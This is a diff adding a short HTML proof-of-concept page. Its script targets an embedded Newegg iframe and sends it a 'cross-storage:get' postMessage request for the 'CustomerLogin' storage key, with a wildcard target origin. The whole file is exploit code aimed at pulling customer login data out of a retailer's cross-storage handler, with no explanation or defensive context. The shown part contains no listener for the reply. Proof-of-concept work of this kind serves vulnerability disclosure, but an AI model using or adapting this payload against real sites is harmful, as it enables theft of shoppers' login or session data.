@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      // wait until the parent finishes loading the target iframe
+      setTimeout(() => {
+        // reference to the Newegg iframe in the parent
+        const targetFrame = window.parent.document.getElementById("newegg-frame");
+
+        if (targetFrame && targetFrame.contentWindow) {
+          // example request payload (fake get request for PoC)
+          const payload = JSON.stringify({
+            id: "1234567",
+            action: "cross-storage:get",
+            params: { key: "CustomerLogin" }
+          });
+
+          targetFrame.contentWindow.postMessage(payload, "*");
+        }
+      }, 2000); // wait a bit for iframe to load
+    </script>
+  </body>
+</html>
